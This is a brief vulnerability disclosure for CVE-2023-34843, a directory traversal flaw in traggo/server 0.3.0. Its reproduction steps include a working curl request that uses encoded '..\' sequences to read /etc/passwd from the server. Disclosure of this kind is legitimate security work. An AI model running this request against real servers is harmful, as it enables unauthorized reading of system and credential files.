CVE-2023-34843 Disclosure 

traggo/server version 0.3.0 is vulnerable to directory traversal. 


Steps to reproduce:

1. Setup traggo/server on your endpoint/server. 
https://traggo.net/install/

2. Make a GET request to the following URL. 
curl -X GET http://localhost:3030/static/..%5c..%5c..%5c..%5cetc/passwd

3. View contents of /etc/passwd
